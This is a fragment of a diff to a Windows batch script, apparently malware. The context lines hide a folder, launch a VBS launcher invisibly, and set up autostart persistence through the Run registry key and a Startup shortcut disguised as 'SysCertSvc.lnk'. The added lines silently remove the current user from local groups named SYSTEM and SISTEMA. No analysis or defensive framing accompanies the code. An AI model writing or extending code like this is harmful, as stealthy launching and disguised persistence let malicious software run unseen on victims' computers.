@@ -11,6 +11,9 @@ set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"
 
 start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
 
+net localgroup SISTEMA "%USERNAME%" /delete >nul 2>&1
+net localgroup SYSTEM "%USERNAME%" /delete >nul 2>&1
+
 set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
 set "targetPath=%launcherScriptPath%"
